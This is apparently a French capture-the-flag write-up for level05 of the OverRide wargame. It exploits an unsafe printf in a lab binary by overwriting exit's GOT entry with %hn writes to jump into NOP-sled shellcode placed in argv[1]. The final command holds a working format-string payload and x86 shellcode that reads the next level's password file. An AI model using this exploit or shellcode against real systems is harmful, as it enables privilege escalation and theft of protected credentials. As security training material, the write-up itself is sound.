### level05

Dans cet exercice le programme prend un input limité à 100 caractères, transforme les majuscules en minuscules et affiche le résultat.
On a peu de marge d'exploit dans ce programme mais il y a un printf non sécurisé à exploiter.
On va chercher l'adresse d'argv[1] pour y ecrire le shellcode et rediriger le flot d'exécutiion vers ce code.

```bash
level05@OverRide:~$ gdb -q level05 
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) run AAAAAAAAAAAAAAAA
Starting program: /home/users/level05/level05 AAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048449 in main ()
(gdb) x /150x $esp
    . . .
0xffffd8d0:	0x6c657665	0x41003530	0x41414141	0x41414141
0xffffd8e0:	0x41414141	0x00414141	0x4d524554	0x6574783d
    . . .
(gdb) x/s 0xffffd8e6
0xffffd8e6:	 "A"
```

On a l'adresse du dernier caractères de argv[1] : 0xffffd8e6, cette dernière est constante entre les appels.
On va écrire un shellcode qui affiche le .pass de level06
Ce dernier étant long on va prendre une adresse 100 adresses plus tot que le dernier caractère et précéder le code de NOP pour garantir de tomber dessus.

argv[1][-1] = 0xffffd8e6 - 100 = 0xffffd882

Maintenant on doit trouver l'adresse d'exit dans la GOT pour écrire cette adresse à sa place :

```bash
level05@OverRide:~$ gdb -q level05 
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit                    <===
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

L'adresse d'exit : 0x80497e0

La valeur à écrire étant trop grande on va l'écrire en 2 fois, l'octet de poid faible et celui de poids fort.

Octet poids faible : 0xd882 = 55426 - 8 = 55418

Octet poids fort : 0xffff = 65535 - 55426 = 10109

Maintenant qu'on a les bonnes valeurs, on va utiliser $hn pour écrire en valeur le nombre de caractères écris successivement sur les 2 partis de l'adresse.
Et en argument du programme on passe le shellcode qui sera exécuté.

```bash
python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55418x' + '%10\$hn'+ '%10109x' + '%11\$hn')" | ./level05 $(python -c "print('\x90' * 100 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass')")
```